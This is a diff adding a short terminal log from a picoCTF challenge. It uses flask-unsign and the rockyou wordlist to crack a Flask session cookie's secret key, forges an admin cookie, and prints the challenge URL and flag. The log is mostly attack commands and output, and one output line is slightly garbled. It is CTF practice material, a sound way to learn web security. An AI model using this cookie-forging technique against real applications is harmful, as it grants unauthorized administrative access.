@@ -1,0 +1,15 @@
+┌─[cristian@localhost]─[~]
+└──╼ $ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.ahLeFQ.PPV3vK-8NkzizvFAzE1szkBzoII" --wordlist /usr/share/wordlists/rockyou.txt --no-literal-eval
+[*] Session decodes to: {'very_auth': 'snickerdoodle'}
+[*] Starting brute-forcer with 8 threads..
+[+] Found secret key after 265600 attemptsideo
+b'molasses'
+
+┌─[cristian@localhost]─[~]
+└──╼ $ flask-unsign --sign --cookie '{"very_auth":"admin"}' --secret 'molasses'         
+eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ahLhLg.laonu0Yjc7fX528BbF5pUdvHZK8
+
+Access at http://wily-courier.picoctf.net:62360/display with the following cookie:
+session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ahLhLg.laonu0Yjc7fX528BbF5pUdvHZK8
+
+picoCTF{cO0ki3s_yum_b8a89e75}
